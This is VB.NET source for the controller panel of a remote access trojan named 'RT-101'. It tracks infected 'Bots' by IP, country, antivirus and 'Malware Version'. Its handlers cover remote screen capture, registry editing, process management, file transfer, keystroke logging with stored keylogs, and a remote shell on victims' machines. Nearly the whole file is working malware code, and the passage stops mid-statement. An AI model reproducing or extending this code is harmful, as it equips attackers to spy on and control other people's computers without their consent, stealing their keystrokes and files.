Imports System.IO
Imports System.Threading
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Data
Imports System.Drawing
Imports System.Text
Imports System.Windows.Forms
Imports System.Runtime.InteropServices
Imports RT101V001.ListViewGroupCollapse
Imports System.Net
Imports System.Text.RegularExpressions
Imports Microsoft.VisualBasic.CompilerServices

Public Class Form1


    Dim RTV_ As String = "0.0.1" ' RT-101 version
    Public WithEvents S As New SocketServer
    Public Yy As String = "|SPX|"
    Public folder As String
    Dim port As Integer = 4783
    Dim recent As Integer = 0

    Public long_0 As Integer = 0 'Upload
    Public long_1 As Integer = 0 'Download

    Public settingsSwitch As Boolean = False
    Public PasswordSocket As String = ""
    Dim x As Integer = 0
    Dim GeoIP As New Getcountry(Application.StartupPath & "\GeoIP.dat")
    Public notifydisconnect As Boolean = False

    Dim kkk As String 'B Buffer
    Public TempGroup As String = ""
    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        Writelog("Rt-101 Exit.")
        End
    End Sub

    Dim sortColumn As Integer = -1


    Private Sub L1_ColumnClick(sender As Object, e As System.Windows.Forms.ColumnClickEventArgs)
        Me.L1.ListViewItemSorter = New ListViewItemComparer(e.Column)
        ' Call the sort method to manually sort.
        L1.Sort()
    End Sub

    ''' <summary>
    ''' Applies the explorer theme to the specified control.
    ''' </summary>
    ''' <param name="control">Indicates the control to apply the theme to.</param>
    Public Function ApplyTheme(ByVal control As Control) As Integer
        Return Me.ApplyTheme(control, "Explorer")
    End Function

    Private Function ApplyTheme(ByVal control As Control, ByVal theme As String) As Integer
        Try
            If control IsNot Nothing Then
                If control.IsHandleCreated Then
                    Return UnsafeNativeMethods.SetWindowTheme(control.Handle, theme, Nothing)
                End If
            End If
        Catch ex As DllNotFoundException
            Return -1
        End Try
        Return -1
    End Function

    ''' <summary>
    ''' Clears the applied theme from the specified control.
    ''' </summary>
    ''' <param name="control">Indicates the control to clear the theme from.</param>
    Public Function ClearTheme(ByVal control As Control) As Integer
        Return Me.ApplyTheme(control, String.Empty)
    End Function



    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        'Settings Folder
        MenuStrip1.BackColor = Color.FromArgb(95, 95, 95)
        MenuStrip1.Renderer = New MyRenderer
        MenuStrip1.Height = 33
        


        If My.Computer.FileSystem.DirectoryExists(Application.StartupPath & "\Settings\") Then
        Else
            My.Computer.FileSystem.CreateDirectory(Application.StartupPath & "\Settings\")
        End If

        Dim valueslogs() As String = File.ReadAllText(Application.StartupPath & "\Settings\" & "\LogsSettings.ini").Split("|"c)
        If valueslogs(0) <> "" Then
            My.Settings.LogFolder = valueslogs(0)
        End If
        If valueslogs(1) <> "" Then
            My.Settings.LogFile = valueslogs(1)
        End If
        If valueslogs(2) = "False" Then
            If File.Exists(Application.StartupPath & "\" & My.Settings.LogFolder & "\" & My.Settings.LogFile & ".txt") Then
                File.Delete(Application.StartupPath & "\" & My.Settings.LogFolder & "\" & My.Settings.LogFile & ".txt")
            End If
        End If

        My.Settings.Save()

        If My.Computer.FileSystem.DirectoryExists(Application.StartupPath & "\" & My.Settings.LogFolder) Then
        Else
            My.Computer.FileSystem.CreateDirectory(Application.StartupPath & "\" & My.Settings.LogFolder)
        End If


        Writelog("Rt-101 starting.")
        Timer1.Start()
        Me.Text = Me.Text.Replace("V", RTV_)
        Control.CheckForIllegalCrossThreadCalls = False
        Dim values() As String = File.ReadAllText(Application.StartupPath & "\Settings\" & "\Settings.ini").Split("|"c)

        PasswordSocket = values(1)
        If values(6) = "True" Then

            Dim log As New Login
            log.ShowDialog()
        End If
        If values(4) = "True" Then
            Dim sett As New Settings
            sett.runauto = True
            sett.passwd.Text = PasswordSocket
            sett.PressB(sender, e)
        End If

        If values(5) = "True" Then
            ClearTheme(L1)
            L1.GridLines = True
        Else
            ApplyTheme(L1)
            L1.GridLines = False
        End If
        If values(7) = "True" Then
            notifydisconnect = True
        Else
            notifydisconnect = False
        End If

    End Sub

    Sub DiscNotify(ByVal ipadr As String, ByVal user As String, ByVal country As String, ByVal sock As Integer)
        Dim lol = New DropNotify()

        'If lol Is Nothing Then
        '        If Me.InvokeRequired Then
        '            Me.Invoke(Sub() DiscNotify(ipadr, user, country, sock))
        '            Exit Sub
        '        End If
        'lol = New DropNotify
        lol.Name = "new" & sock 'name
        lol.Label2.Text = "Client '" & user & "' (" & country & ", " & ipadr & ") disconnected."
        lol.Timer1.Enabled = True

        System.Windows.Forms.Application.Run(lol)
        'End If
    End Sub

#Region "Server Events"
    Sub Disconnect(ByVal sock As Integer) Handles S.DisConnected

        If notifydisconnect = True Then
            Dim ipadr, user, country As String
            For I As Integer = 0 To L1.Items.Count - 1
                If L1.Items(I).ToolTipText.ToString = sock.ToString Then
                    ipadr = L1.Items(I).SubItems(0).Text 'ip
                    user = L1.Items(I).SubItems(2).Text
                    country = L1.Items(I).SubItems(4).Text
                End If
            Next
            If ipadr <> "" Then
                Dim Evaluator = New Thread(Sub() Me.DiscNotify(ipadr, user, country, sock))
                Evaluator.Start()

                Label8.Text = "Total : " & S.Online.Count.ToString

                onlinedudes.Text = S.Online.Count.ToString
                Me.Text = Me.Text.Replace("V", RTV_)
                NotifyIcon1.Text = "Bots: " & S.Online.Count
                Try
                    L1.Items(sock.ToString).Remove()
                    Writelog("client disconnected.")
                Catch ex As Exception
                End Try
            End If

        End If






    End Sub

    Sub Connected(ByVal sock As Integer) Handles S.Connected
        Label8.Text = "Total : " & S.Online.Count.ToString

        Me.Text = Me.Text.Replace("V", RTV_)
        NotifyIcon1.Text = "Bots: " & S.Online.Count
        onlinedudes.Text = S.Online.Count.ToString
        recent += 1
        recentdudes.Text = recent.ToString
        S.Send(sock, "~" & Yy & PasswordSocket)
        Writelog("new client connected.")
    End Sub

    Dim DoubleBytes As Double
    Default Public Property FormatBytes(ByVal BytesCaller As ULong) As String
        Get
            Try
                Select Case BytesCaller
                    Case Is >= 1099511627776
                        DoubleBytes = CDbl(BytesCaller / 1099511627776) 'TB
                        Return FormatNumber(DoubleBytes, 2) & " TB"
                    Case 1073741824 To 1099511627775
                        DoubleBytes = CDbl(BytesCaller / 1073741824) 'GB
                        Return FormatNumber(DoubleBytes, 2) & " GB"
                    Case 1048576 To 1073741823
                        DoubleBytes = CDbl(BytesCaller / 1048576) 'MB
                        Return FormatNumber(DoubleBytes, 2) & " MB"
                    Case 1024 To 1048575
                        DoubleBytes = CDbl(BytesCaller / 1024) 'KB
                        Return FormatNumber(DoubleBytes, 2) & " KB"
                    Case 0 To 1023
                        DoubleBytes = BytesCaller ' bytes
                        Return FormatNumber(DoubleBytes, 2) & " B"
                    Case Else
                        Return ""
                End Select
            Catch
                Return ""
            End Try
        End Get
        Set(value As String)

        End Set
    End Property
    'Network Measure
    Public Shared Function smethod_17(ByVal long_1 As Long) As String
        If (long_1.ToString.Length < 4) Then
            Return (Conversions.ToString(long_1) & " Bytes")
        End If
        Dim str As String = String.Empty
        Dim num As Double = (CDbl(long_1) / 1024)
        If (num < 1024) Then
            str = "KB"
        Else
            num = (num / 1024)
            If (num < 1024) Then
                str = "MB"
            Else
                num = (num / 1024)
                str = "GB"
            End If
        End If
        Return (num.ToString(".0") & " " & str)
    End Function

    Delegate Sub _Data(ByVal sock As Integer, ByVal B As Byte())

    Sub Data(ByVal sock As Integer, ByVal B As Byte()) Handles S.Data
        Dim T As String = BS(B)
        kkk = T 'Disconnect Usage
        Dim A As String() = Split(T, Yy)

        long_1 = Convert.ToInt32(BS(B).Length)

        Try
            Select Case A(0)
                Case "~" ' Client Sent me PC name
                    Dim values() As String = File.ReadAllText(Application.StartupPath & "\Settings" & "\Settings.ini").Split("|"c)
                    If values(3) = "True" Then
                        '    'Notify
                        '    'NotifyIcon1.ShowBalloonTip(2000, "New Connection : " & S.IP(sock) & " - " & A(2), "PC@USER : " & A(1) & Environment.NewLine & "COUNTRY : " & GeoIP.LookupCountryName(S.IP(sock)) & Environment.NewLine & "OS : " & A(4), ToolTipIcon.Info)
                        Dim notf As Notify = My.Application.OpenForms("new" & sock)
                        If notf Is Nothing Then
                            If Me.InvokeRequired Then
                                Me.Invoke(New _Data(AddressOf Data), New Object() {sock, B})
                                Exit Sub
                            End If
                            notf = New Notify
                            notf.Name = "new" & sock 'name
                            notf.Label2.Text = "Client '" & A(1) & "' (" & GeoIP.LookupCountryName(S.IP(sock)) & ", " & S.IP(sock) & ") connected."
                            notf.Label3.Text = S.IP(sock)
                            notf.Timer1.Enabled = True
                            notf.Show()
                        End If
                    End If

                    Dim L = L1.Items.Add(sock.ToString, S.IP(sock), 0)
                    Dim img As Image = Image.FromFile(Application.StartupPath & "\Flag\" & GeoIP.LookupCountryCode(S.IP(sock)) & ".png")
                    ImageList1.Images.Add(img)
                    L.ImageIndex = x
                    x = x + 1
                    L.SubItems.Add(A(2)) 'Tag
                    L.SubItems.Add(A(1)) 'User@PC
                    L.SubItems.Add(A(3)) 'Version
                    L.SubItems.Add(GeoIP.LookupCountryName(S.IP(sock))) 'Country
                    L.SubItems.Add(A(4)) 'osVersion
                    L.SubItems.Add(A(5)) 'CPU
                    L.SubItems.Add(A(6)) 'Perms
                    If A(7) = "-" Then
                        L.SubItems.Add("")
                    Else
                        L.SubItems.Add(A(7)) 'Notes
                    End If
                    L.SubItems.Add(A(8)) 'Install Date
                    L.SubItems.Add(A(9)) 'FileName
                    L.SubItems.Add(A(10)) 'AntiVirus


                    L.ToolTipText = sock
                    Writelog("client connected : " & S.IP(sock) & " - " & A(1))


                    If My.Computer.FileSystem.DirectoryExists(Application.StartupPath & "/Users/" & (A(1)) & "/Download") Then
                    Else
                        My.Computer.FileSystem.CreateDirectory(Application.StartupPath & "/Users/" & (A(1)) & "/Download")
                    End If
                    folder = (Application.StartupPath & "/Users/" & (A(1)) & "/Download\")

                Case "!" ' i recive size of client screen
                    ' lets start Cap form and start capture desktop
                    If My.Application.OpenForms("!" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim cap As New Cap
                    cap.F = Me
                    cap.Sock = sock
                    cap.snapfolder = folder

                    cap.Name = "!" & sock
                    cap.Sz = New Size(A(1), A(2))
                    cap.Show()
                Case "@" ' i recive image  
                    Dim F As Cap = My.Application.OpenForms("!" & sock)
                    If F IsNot Nothing Then
                        If A(1).Length = 1 Then
                            F.Text = "Size: " & siz(B.Length) & " ,No Changes"
                            If F.Button1.Text = "Stop" Then
                                S.Send(sock, "@" & Yy & F.C1.SelectedIndex & Yy & F.C2.Text & Yy & F.C.Value)
                            End If
                            Exit Sub
                        End If
                        Dim BB As Byte() = fx(B, "@" & Yy)(1)
                        F.PktToImage(BB)
                    End If
                Case "openRG"
                    Writelog("opening registry editor on " & S.IP(sock) & ".")
                    Dim reg As RegistryEditor = My.Application.OpenForms("Reg" & sock)
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim regi As New RegistryEditor
                    regi.Name = "Reg" & sock
                    regi.sock = sock
                    regi.Text += S.IP(sock) & "]"
                    regi.Show()
                Case "RG"

                    Dim reg As RegistryEditor = My.Application.OpenForms("Reg" & sock)
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If

                    Select Case A(1)
                        Case "Can't access to feeds."
                            reg.RGk.Enabled = True
                            reg.RGLIST.Enabled = True
                            reg.RGLIST.Items.Clear()
                            reg.pr.Value = 0
                            reg.Label1.Text = "Status : Ready"

                            Dim item As ListViewItem = reg.RGLIST.Items.Add("ERROR")
                            item.SubItems.Add("ERROR")
                            item.SubItems.Add("ERROR")

                            reg.Label1.Text = "Status : Access denied"
                            MessageBox.Show("Can't access to feeds, maybe this folder requires Admin privileges.", "ERROR!", MessageBoxButtons.OK, MessageBoxIcon.Error)
                            Return
                        Case "~"
                            reg.RGk.Enabled = True
                            reg.RGLIST.Enabled = True
                            reg.RGk.SelectedNode.Nodes.Clear()
                            reg.RGLIST.Items.Clear()
                            reg.pr.Value = 0
                            reg.pr.Maximum = (A.Length - 3)
                            Dim num20 As Integer = (A.Length - 1)
                            Dim i As Integer = 3
                            Do While (i <= num20)
                                Try
                                    reg.pr = reg.pr
                                    reg.pr.Value += 1
                                    If (A(i).Length > 0) Then
                                        If A(i).Contains("/") Then
                                            Dim strArray2 As String() = Strings.Split(A(i), "/", -1, CompareMethod.Binary)
                                            Dim item As ListViewItem = reg.RGLIST.Items.Add(strArray2(0))
                                            item.SubItems.Add(strArray2(1))
                                            Try
                                                item.SubItems.Add(strArray2(2))
                                            Catch exception17 As Exception

                                                Dim exception3 As Exception = exception17

                                            End Try
                                            If (strArray2(1) = "String") Then
                                                item.ImageIndex = 1
                                            Else
                                                item.ImageIndex = 2
                                            End If
                                        Else
                                            reg.RGk.SelectedNode.Nodes.Add(A(i))
                                        End If
                                    End If
                                Catch exception18 As Exception

                                    Dim exception4 As Exception = exception18

                                End Try
                                i += 1
                            Loop
                            reg.RGk.SelectedNode.Expand()
                            reg.RGk.Select()
                            reg.RGk.Focus()
                            Dim num21 As Integer = (reg.RGLIST.Columns.Count - 1)
                            Dim j As Integer = 0
                            Do While (j <= num21)
                                reg.RGLIST.Columns.Item(j).AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize)
                                j += 1
                            Loop
                            reg.pr.Value = 0

                            Exit Select

                    End Select
                    reg.Label1.Text = "Status : Ready"
                Case "sendinformation"
                    Writelog("getting information computer from " & S.IP(sock))
                    If My.Application.OpenForms("Information" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If

                    Dim info As New Information
                    info.sock = sock
                    info.Name = "Information" & sock
                    info.Text = info.Text & S.IP(sock) & "]"

                    Dim I1 = info.ListView1.Items.Add("PC Name")
                    I1.SubItems.Add(A(1))
                    Dim I2 = info.ListView1.Items.Add("Username")
                    I2.SubItems.Add(A(2))
                    Dim I3 = info.ListView1.Items.Add("Operating System")
                    I3.SubItems.Add(A(3))
                    Dim I4 = info.ListView1.Items.Add("Operating System Platform")
                    I4.SubItems.Add(A(4))
                    Dim I5 = info.ListView1.Items.Add("Antivirus")
                    I5.SubItems.Add(A(5))
                    Dim I6 = info.ListView1.Items.Add("Memory (RAM)")
                    I6.SubItems.Add(A(6))
                    Dim I7 = info.ListView1.Items.Add("Malware Version")
                    I7.SubItems.Add(A(7))
                    Dim I8 = info.ListView1.Items.Add("Remote Local Time")
                    I8.SubItems.Add(A(8))
                    Dim I9 = info.ListView1.Items.Add("Current Directory")
                    I9.SubItems.Add(A(10))
                    Dim I10 = info.ListView1.Items.Add("System Directory")
                    I10.SubItems.Add(A(11))
                    Dim I11 = info.ListView1.Items.Add("User Domain Name")
                    I11.SubItems.Add(A(12))
                    Dim I12 = info.ListView1.Items.Add("User Active")
                    I12.SubItems.Add(A(13))
                    Dim I13 = info.ListView1.Items.Add("Machine Language")
                    I13.SubItems.Add(A(16))
                    Dim I14 = info.ListView1.Items.Add("Malware Path")
                    I14.SubItems.Add(A(17))
                    Dim I15 = info.ListView1.Items.Add("Malware Port")
                    I15.SubItems.Add(A(18))
                    Dim I16 = info.ListView1.Items.Add("CPU")
                    I16.SubItems.Add(A(20))
                    Dim I17 = info.ListView1.Items.Add("Processor")
                    I17.SubItems.Add(A(21))
                    Dim I18 = info.ListView1.Items.Add("First startup")
                    I18.SubItems.Add(A(23))
                    Dim I19 = info.ListView1.Items.Add("Manifacture")
                    I19.SubItems.Add(A(25))

                    info.Show()

                Case "OpenPro"
                    Writelog("running process manager on " & S.IP(sock) & ".")
                    If L1.FindItemWithText(S.IP(sock)) Is Nothing Then
                        S.Disconnect(sock)
                    End If
                    If My.Application.OpenForms("OpenPro" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New ProcessManager
                    f.sock = sock
                    f.Name = "OpenPro" & sock
                    f.Text = f.Text & S.IP(sock) & "] " & A(1)

                    f.Show()
                Case "ProcessManager"
                    If L1.FindItemWithText(S.IP(sock)) Is Nothing Then
                        S.Disconnect(sock)
                    End If

                    Dim fProc As ProcessManager = My.Application.OpenForms("OpenPro" & sock)
                    fProc.Enabled = False
                    fProc.ToolStripStatusLabel1.Text = "Status: Receiving feeds ..."
                    Dim allProcess As String() = Split(A(2), "ProcessSplit")
                    Dim x As String = ""

                    For Each x In allProcess
                        If Not x = "" Then
                            Dim xx As String() = Split(x, "|")

                            Dim itm As New ListViewItem
                            itm.Text = xx(0) & ".exe" ' Name
                            If xx(2) = "-" Then xx(2) = "System" ' Path
                            itm.SubItems.Add(xx(2)) ' Path

                            itm.SubItems.Add(xx(1)) ' PID
                            If xx(4) = "-" Then xx(4) = "With Windows" ' Date Start
                            itm.SubItems.Add(xx(4)) ' Date Start

                            itm.SubItems.Add(FormatBytes(FormatNumber(Math.Round(xx(3) / 1024), 0))) ' CPU



                            itm.ImageIndex = 0


                            fProc.PListView.Items.Add(itm)
                        End If
                    Next
                    fProc.PListView.FindItemWithText(A(1)).ForeColor = Color.Red
                    fProc.Enabled = True
                    fProc.ToolStripStatusLabel1.Text = "Status: Ready"


                Case "UploadDone"
                    Writelog("uploaded file to " & S.IP(sock) & ".")
                    Dim fff As FileManager = My.Application.OpenForms("|||" & sock)
                    fff.ListView2.Items(0).SubItems(2).Text = "Completed" ' Completed Transfer ListView
                    fff.ListView2.Items(0).ImageIndex = 1 ' Update Image ListView
                    'fff.Refresh()
                Case "downloadedfile"
                    Writelog("downloaded file from " & S.IP(sock) & ".")
                    Dim fff As FileManager = My.Application.OpenForms("|||" & sock)
                    Try
                        IO.File.WriteAllBytes(folder & A(2), Convert.FromBase64String(A(1)))
                        Threading.Thread.CurrentThread.Sleep(1000)

                        fff.ListView2.Items(0).SubItems(2).Text = "Completed" ' Completed Transfer ListView
                        fff.ListView2.Items(0).ImageIndex = 1 ' Update Image ListView
                        fff.ToolStripStatusLabel1.Text = "Status: Ready"
                    Catch

                        fff.ListView2.Items(0).SubItems(2).Text = "Error" ' Error Transfer ListView
                        fff.ListView2.Items(0).ImageIndex = 2 ' Update Image ListView
                        fff.ToolStripStatusLabel1.Text = "Status: Error downloading file"
                    End Try


                Case "|||"
                    Writelog("opening file manager on " & S.IP(sock) & ".")
                    If My.Application.OpenForms("|||" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim fm As New FileManager
                    fm.sock = sock
                    fm.Name = "|||" & sock
                    fm.Text = fm.Text & S.IP(sock) & "]"
                    fm.Show()
                Case "keylogger"
                    Writelog("monitoring key strokes on " & S.IP(sock) & ".")
                    If My.Application.OpenForms("|||" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim kl As New Keylogger
                    kl.sock = sock
                    kl.Text = kl.Text & S.IP(sock) & "]"
                    kl.Show()
                Case "addnote"
                    Writelog("adding note to " & S.IP(sock) & ".")
                    If My.Application.OpenForms("|||" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim nt As New AddNote
                    nt.Sock = sock
                    nt.Text = nt.Text & S.IP(sock) & "]"
                    nt.TextBox1.Text = A(1)
                    nt.Show()
                Case "noteupdated"
                    Writelog("Note saved.")
                    For i = L1.Items.Count - 1 To 0 Step -1
                        Dim CurrentSubItems As ListViewItem.ListViewSubItemCollection = L1.Items(i).SubItems
                        If CurrentSubItems(0).Text = S.IP(sock) Then
                            L1.Items(i).SubItems(8).Text = A(1)
                        End If
                    Next

                Case "keylogs"
                    Writelog("Retriving keylogs from " & S.IP(sock) & ".")
                    If My.Computer.FileSystem.DirectoryExists(folder & "\Keylogs\") Then
                    Else
                        My.Computer.FileSystem.CreateDirectory(folder & "\Keylogs\")
                    End If
                    IO.File.WriteAllBytes(folder & "\Keylogs\" & DateTime.Now.ToString("dd-MM-yyyy_HH-mm-ss") & ".html", Convert.FromBase64String(A(1)))

                Case "openshell"
                    Writelog("deploying remote shell on " & S.IP(sock) & ".")
                    If My.Application.OpenForms("openshell" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim fm As New RemoteShell
                    fm.sock = sock
                    fm.Name = "openshell" & sock
                    fm.Text = fm.Text & S.IP(sock) & "] "
                    fm.Show()

                Case "rs"
                    Try
                        Dim sh As RemoteShell = My.Application.OpenForms("openshell" & sock)
                        sh.RichTextBox1.AppendText(DEB(A(1)) & vbNewLine)
                    Catch : End Try

                Case "rsc"
                    Try
                        Dim sh As RemoteShell = My.Application.OpenForms("openshell" & sock)
                        sh.Close()
                    Catch : End Try
                Case "openkl"
                    If My.Application.OpenForms("openkl" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim fm As New Keylogger
                    fm.sock = sock
                    fm.Name = ("openkl" & sock)
                    fm.Text = fm.Text & S.IP(sock) & "]"
                    fm.Show()
                Case "loges"
                    Dim F As Keylogger = My.Application.OpenForms("openkl" & sock)
                    Dim T1 As New Thread(AddressOf F.Getloges)
                    T1.Start(A(1))
                Case "getpath"
                    Dim fff As FileManager = My.Application.OpenForms("|||" & sock)
                    fff.TextBox1.Text = A(1)
                    S.Send(sock, "FileManager" & Yy & A(1))
                Case "FileManager"
                    Dim fff As FileManager = My.Application.OpenForms("|||" & sock)
                    fff.Rights = L1.Items(L1.FocusedItem.Index).SubItems(6).Text
                    Dim addtolist As Boolean = False
                    If A(1) = "Error" Then
                        ' MsgBox("error")
                    Else
                        fff.ListView1.Items.Clear()
                        Dim allFiles As String() = Split(A(1), "FileManagerSplit")
                        For i = 0 To allFiles.Length - 2
                            Dim itm As New ListViewItem
                            itm.Text = allFiles(i)
                            itm.SubItems.Add(allFiles(i + 1))
                            If Not itm.Text.StartsWith("[Drive]") And Not itm.Text.StartsWith("[CD]") And Not itm.Text.StartsWith("[Folder]") Then
                                Dim fsize As Long = Convert.ToInt64(itm.SubItems(1).Text)
                                If fsize > 1073741824 Then
                                    Dim size As Double = fsize / 1073741824
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " GB"
                                ElseIf fsize > 1048576 Then
                                    Dim size As Double = fsize / 1048576
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " MB"
                                ElseIf fsize > 1024 Then
                                    Dim size As Double = fsize / 1024
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " KB"
                                Else
                                    itm.SubItems(1).Text = fsize.ToString & " B"
                                End If
                                itm.Tag = Convert.ToInt64(allFiles(i + 1))
                            End If
                            If itm.Text.StartsWith("[Drive]") Then
                                fff.ComboBox1.Items.Add(itm.Text.Substring(7))
                                addtolist = False
                                If itm.Text.Substring(7) = "C:\" Then
                                    fff.ComboBox1.SelectedIndex = fff.ComboBox1.FindStringExact("C:\")
                                    fff.TextBox1.Text = "C:\"
                                    fff.ToolStripStatusLabel1.Text = "Status: Ready"
                                End If

                                'itm.ImageIndex = 0
                                'itm.Text = itm.Text.Substring(7)
                            ElseIf itm.Text.StartsWith("[CD]") Then
                                fff.ComboBox1.Items.Add(itm.Text.Substring(4))
                                addtolist = False
                            Else

                                addtolist = True
                            End If

                            If itm.Text.StartsWith("[Folder]") Then
                                itm.ImageIndex = 0
                                itm.Text = itm.Text.Substring(8)
                                itm.SubItems.Add("Directory")

                            ElseIf itm.Text.EndsWith(".exe") Or itm.Text.EndsWith(".EXE") Or itm.Text.EndsWith(".scr") Or itm.Text.EndsWith(".SCR") Then
                                itm.ImageIndex = 1
                                addtolist = True
                                itm.SubItems.Add("File")
                            ElseIf itm.Text.EndsWith(".jpg") Or itm.Text.EndsWith(".JPG") Or itm.Text.EndsWith(".jpeg") Or itm.Text.EndsWith(".JPEG") Or itm.Text.EndsWith(".ico") Or itm.Text.EndsWith(".ICO") Or itm.Text.EndsWith(".svg") Or itm.Text.EndsWith(".SVG") Or itm.Text.EndsWith(".svgz") Or itm.Text.EndsWith(".SVGZ") Or itm.Text.EndsWith(".drw") Or itm.Text.EndsWith(".DRW") Or itm.Text.EndsWith(".psp") Or itm.Text.EndsWith(".PSP") Or itm.Text.EndsWith(".gif") Or itm.Text.EndsWith(".GIF") Or itm.Text.EndsWith(".png") Or itm.Text.EndsWith(".PNG") Or itm.Text.EndsWith(".bmp") Or itm.Text.EndsWith(".BMP") Or itm.Text.EndsWith(".dib") Or itm.Text.EndsWith(".DIB") Or itm.Text.EndsWith(".jpe") Or itm.Text.EndsWith(".JPE") Or itm.Text.EndsWith(".jfif") Or itm.Text.EndsWith(".JFIF") Or itm.Text.EndsWith(".tif") Or itm.Text.EndsWith(".TIF") Or itm.Text.EndsWith(".tiff") Or itm.Text.EndsWith(".TIFF") Then
                                itm.ImageIndex = 2
                                addtolist = True
                                itm.SubItems.Add("File")
                            ElseIf itm.Text.EndsWith(".txt") Or itm.Text.EndsWith(".TXT") Or itm.Text.EndsWith(".log") Or itm.Text.EndsWith(".LOG") Or itm.Text.EndsWith(".readme") Or itm.Text.EndsWith(".README") Or itm.Text.EndsWith(".me") Or itm.Text.EndsWith(".ME") Then
                                itm.ImageIndex = 3
                                addtolist = True
                                itm.SubItems.Add("File")
                            ElseIf itm.Text.EndsWith(".dll") Or itm.Text.EndsWith(".DLL") Or itm.Text.EndsWith(".db") Or itm.Text.EndsWith(".DB") Then
                                itm.ImageIndex = 4
                                addtolist = True
                                itm.SubItems.Add("File")
                            ElseIf itm.Text.EndsWith(".zip") Or itm.Text.EndsWith(".ZIP") Or itm.Text.EndsWith(".rar") Or itm.Text.EndsWith(".RAR") Or itm.Text.EndsWith(".7z") Or itm.Text.EndsWith(".7Z") Or itm.Text.EndsWith(".jar") Or itm.Text.EndsWith(".JAR") Or itm.Text.EndsWith(".tar") Or itm.Text.EndsWith(".TAR") Or itm.Text.EndsWith(".tgz") Or itm.Text.EndsWith(".TGZ") Or itm.Text.EndsWith(".gz") Or itm.Text.EndsWith(".GZ") Or itm.Text.EndsWith(".bz2") Or itm.Text.EndsWith(".BZ2") Or itm.Text.EndsWith(".tbz2") Or itm.Text.EndsWith(".TBZ2") Or itm.Text.EndsWith(".gzip") Or itm.Text.EndsWith(".GZIP") Or itm.Text.EndsWith(".z") Or itm.Text.EndsWith(".Z") Or itm.Text.EndsWith(".sit") Or itm.Text.EndsWith(".SIT") Or itm.Text.EndsWith(".cab") Or itm.Text.EndsWith(".CAB") Or itm.Text.EndsWith(".lzh") Or itm.Text.EndsWith(".LZH") Or itm.Text.EndsWith(".pkg") Or itm.Text.EndsWith(".PKG") Then
                                itm.ImageIndex = 5
                                addtolist = True
                                itm.SubItems.Add("File")
                            ElseIf itm.Text.EndsWith(".avi") Or itm.Text.EndsWith(".AVI") Or itm.Text.EndsWith(".divx") Or itm.Text.EndsWith(".DIVX") Or itm.Text.EndsWith(".mkv") Or itm.Text.EndsWith(".MKV") Or itm.Text.EndsWith(".webm") Or itm.Text.EndsWith(".WEBM") Or itm.Text.EndsWith(".mp4") Or itm.Text.EndsWith(".MP4") Or itm.Text.EndsWith(".m4v") Or itm.Text.EndsWith(".M4V") Or itm.Text.EndsWith(".mp4v") Or itm.Text.EndsWith(".MP4V") Or itm.Text.EndsWith(".mpv4") Or itm.Text.EndsWith(".MPV4") Or itm.Text.EndsWith(".ogm") Or itm.Text.EndsWith(".OGM") Or itm.Text.EndsWith(".ogv") Or itm.Text.EndsWith(".OGV") Or itm.Text.EndsWith(".flv") Or itm.Text.EndsWith(".FLV") Or itm.Text.EndsWith(".mpeg") Or itm.Text.EndsWith(".MPEG") Or itm.Text.EndsWith(".mpg") Or itm.Text.EndsWith(".MPG") Or itm.Text.EndsWith(".mp2v") Or itm.Text.EndsWith(".MP2V") Or itm.Text.EndsWith(".mpv2") Or itm.Text.EndsWith(".MPV2") Or itm.Text.EndsWith(".m1v") Or itm.Text.EndsWith(".M1V") Or itm.Text.EndsWith(".m2v") Or itm.Text.EndsWith(".M2V") Or itm.Text.EndsWith(".m2p") Or itm.Text.EndsWith(".M2P") Or itm.Text.EndsWith(".mpe") Or itm.Text.EndsWith(".MPE") Or itm.Text.EndsWith(".ts") Or itm.Text.EndsWith(".TS") Or itm.Text.EndsWith(".m2ts") Or itm.Text.EndsWith(".M2TS") Or itm.Text.EndsWith(".mts") Or itm.Text.EndsWith(".MTS") Or itm.Text.EndsWith(".m2t") Or itm.Text.EndsWith(".M2T") Or itm.Text.EndsWith(".tps") Or itm.Text.EndsWith(".TPS") Or itm.Text.EndsWith(".hdmov") Or itm.Text.EndsWith(".HDMOV") Or itm.Text.EndsWith(".mov") Or itm.Text.EndsWith(".MOV") Or itm.Text.EndsWith(".3gp") Or itm.Text.EndsWith(".3GP") Or itm.Text.EndsWith(".3gpp") Or itm.Text.EndsWith(".3GPP") Or 